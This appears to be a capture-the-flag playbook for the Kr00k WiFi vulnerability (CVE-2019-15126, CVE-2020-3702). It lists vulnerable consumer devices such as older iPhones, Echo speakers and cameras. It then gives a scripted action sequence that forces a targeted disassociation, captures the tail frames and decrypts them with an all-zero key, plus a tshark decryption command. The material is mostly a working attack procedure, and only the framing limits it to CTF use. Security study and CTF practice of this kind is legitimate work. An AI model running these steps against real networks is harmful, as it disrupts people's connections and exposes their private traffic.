# Kr00k tail flag — disassoc, decrypt tail frames with PTK=0

The Broadcom/Cypress/QCA disassoc bug. Force disassoc, capture the
tail frames the chipset flushes with an all-zero PTK, decrypt with a
16-byte zero key.

## Recognition

The vulnerable client is what matters, not the AP. Fingerprint via
probe-request IE order + OUI. Common vulnerable classes as of 2026:

- Older iPhones (5s..X), Amazon Echo (Dot 3rd gen and older), Kindle
  Fire tablets, many older WiFi cameras (Wyze, Ring pre-2020), some
  Sonos generations. Broadcom/Cypress/QCA silicon that never got a
  firmware update.

Companion CVEs: CVE-2019-15126 (Broadcom/Cypress), CVE-2020-3702
(Qualcomm variant).

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},

    # 1. Confirm client is on channel and passing traffic.
    {"action": "capture_start",
     "iface": "wlan1mon",
     "channel": 6,
     "bssid": "AA:BB:CC:DD:EE:FF",
     "out_path": "/tmp/kr00k.pcapng"},

    # 2. Force a disassoc.
    {"action": "disassoc_targeted",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "client": "11:22:33:44:55:66",
     "count": 5},

    # 3. Let the tail frames land.
    {"action": "wait", "s": 5},
    {"action": "capture_stop"},

    # 4. Decrypt offline with PTK=0.
    {"action": "wireshark_decrypt_zero_key",
     "pcap_path": "/tmp/kr00k.pcapng",
     "out_path": "/tmp/kr00k-decoded.pcapng"},
])
```

## Manual decrypt (tshark)

Kr00k zeroes the **TK** (temporal key), not the PMK/PSK. Use tshark
key type `tk` — 16 hex zero bytes for CCMP-128 / TKIP, 32 hex zero
bytes for GCMP-256 or CCMP-256.

```
tshark -r kr00k.pcapng \
  -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"tk\",\"00000000000000000000000000000000\"" \
  -Y "ip or http or dns" \
  -V
```

## The flag surface

The tail frames the chipset flushes are the last frames the STA had
buffered. In a WCTF this is:

- **HTTP request** with the flag in the URL or Host header.
- **DNS query** for a flag-carrying hostname.
- **TCP payload** with `flag{...}` as raw bytes.

Only a handful of frames land per disassoc. Repeat the trigger
several times on a busy client to accumulate.

## Failure modes

- **No tail frames captured.** Client not vulnerable, or chipset had
  0 frames queued at disassoc time. Wait for busier traffic and retry.
- **Frames captured but decrypt yields garbage.** Client is patched;
  the PTK wasn't zeroed. Confirm the target OUI/chipset against
  `chipset_vulns.json`.
- **PMF-required.** Disassoc drops. Kr00k relies on the client's
  handling of the disassoc frame; if it doesn't arrive, the primitive
  doesn't fire.

## Cite

- attacks.json: `kr00k-broadcom-cve-2019-15126`,
  `kr00k-qca-cve-2020-3702`.
- ESET Kr00k white paper 2020.
- cves.json: CVE-2019-15126, CVE-2020-3702.
